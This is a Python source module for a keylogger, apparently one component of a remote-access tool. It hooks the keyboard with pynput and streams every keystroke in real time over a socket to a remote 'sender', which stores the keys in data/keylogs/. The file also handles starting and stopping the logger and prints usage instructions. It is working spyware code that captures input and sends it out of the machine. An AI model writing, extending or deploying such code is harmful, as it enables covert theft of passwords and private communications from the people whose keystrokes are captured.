"""
Keylogger feature - Real-time keystroke streaming
"""

import socket
import threading
from datetime import datetime
from pynput import keyboard
from utils.protocol import send_text, send_error
from utils.modes import Mode, ModeManager
from utils.common import log


def start_keylogger(sock: socket.socket, mode_manager: ModeManager) -> None:
    """
    Start keylogger mode - streams keystrokes to sender in real-time.

    Args:
        sock: Socket to stream keystrokes through
        mode_manager: Mode manager instance
    """
    # Check if we can enter keylogger mode
    if not mode_manager.set_mode(Mode.KEYLOGGER):
        send_error(sock, "Already in another mode. Use /stop first.")
        return

    # Send confirmation with timestamp
    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
    send_text(sock, f"<KEYLOG_START>{timestamp}")
    log(f"Keylogger started - session: {timestamp}")

    # Start keylogger in background thread
    def keylogger_worker():
        """Worker function that runs the keylogger"""

        def on_press(key):
            """Callback for key press events"""
            if mode_manager.is_stopping():
                return False  # Stop listener

            try:
                # Format the keystroke
                if hasattr(key, "char") and key.char is not None:
                    keystroke = key.char
                else:
                    # Special keys
                    key_name = str(key).replace("Key.", "")
                    keystroke = f"[{key_name}]"

                # Stream keystroke to sender immediately
                try:
                    sock.sendall(keystroke.encode("utf-8", errors="replace"))
                except (socket.error, BrokenPipeError):
                    log("Keylogger: Connection lost")
                    return False  # Stop listener

            except Exception as e:
                log(f"Keylogger error: {e}")

            return True  # Continue listening

        # Create and start keyboard listener
        try:
            with keyboard.Listener(on_press=on_press, suppress=False) as listener:
                listener.join()
        except Exception as e:
            log(f"Keylogger listener error: {e}")

        log("Keylogger thread stopped")

    # Start worker thread
    mode_manager.active_thread = threading.Thread(target=keylogger_worker, daemon=True)
    mode_manager.active_thread.start()


def stop_keylogger(sock: socket.socket, mode_manager: ModeManager) -> None:
    """
    Stop keylogger mode.

    Args:
        sock: Socket to send confirmation through
        mode_manager: Mode manager instance
    """
    if mode_manager.current_mode != Mode.KEYLOGGER:
        send_error(sock, "Keylogger is not running.")
        return

    # Signal stop
    mode_manager.signal_stop()

    # Wait for thread to finish
    mode_manager.wait_for_thread(timeout=2)

    # Send end marker
    send_text(sock, "<KEYLOG_END>")
    log("Keylogger stopped")

    # Reset mode
    mode_manager.reset_mode()


def dump_keylog(sock: socket.socket, mode_manager: ModeManager) -> None:
    """
    Dump keylog buffer (not applicable with streaming architecture).
    This command is kept for compatibility but explains the streaming model.

    Args:
        sock: Socket to send message through
        mode_manager: Mode manager instance
    """
    message = """
[INFO: Keylogger uses streaming architecture]
Keystrokes are sent to sender.py in real-time and saved there.
The receiver does not buffer keystrokes locally.

Usage:
  /keylogger  - Start streaming keystrokes
  /stop       - Stop streaming
  
All keystrokes are automatically saved to data/keylogs/ on sender.py.
"""
    send_text(sock, message)
